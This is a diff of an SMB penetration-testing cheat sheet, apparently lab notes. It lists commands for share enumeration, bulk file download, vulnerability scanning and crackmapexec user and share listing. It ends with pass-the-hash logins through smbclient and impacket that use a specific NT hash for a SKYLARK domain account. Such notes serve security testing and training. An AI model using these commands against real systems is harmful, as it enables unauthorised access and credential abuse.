@@ -88,23 +88,27 @@
 
 4. Changing Shares: smbclient -L \\\\<IP>\\C$
 
-5. Lists file with permissions: smbmap -H <IP>
+5. Username/password/Domain: smbclient -L \\\\<IP>\\C$ -U <Domain>/<username>%<password>
 
-6. Downloading: smbget -R smb://<IP>/anonymous
+6. $smbclient -L myhost -U DOMAIN/user -W workgroup
 
-7. type prompt off, recurse on -> lets us download all the files using mget *
+7. Lists file with permissions: smbmap -H <IP>
 
-8. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 <IP>
+8. Downloading: smbget -R smb://<IP>/anonymous
 
-9. crackmapexec smb <IP>
+9. type prompt off, recurse on -> lets us download all the files using mget *
 
-10. Users: crackmapexec smb <IP> --users
+10. Nmap Vuln Script: nmap --script "smb-vuln*" -p 139,445 <IP>
 
-11. Shares: crackmapexec smb <IP> --shares
+11. crackmapexec smb <IP>
 
-12. Try Crackmapexec, psexec, smbexec, wmiexec
+12. Users: crackmapexec smb <IP> --users
 
-14.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379
+13. Shares: crackmapexec smb <IP> --shares
+
+14. Try Crackmapexec, psexec, smbexec, wmiexec
+
+15.  smbclient //10.20.85.111/Users -U SKYLARK/k.smith --pw-nt-hash d2a87ca4d6735870dc2357a83960c379
 
 16. impacket-smbclient  -hashes 00000000000000000000000000000000:d2a87ca4d6735870dc2357a83960c379 skylark/k.smith@10.20.109.111
 
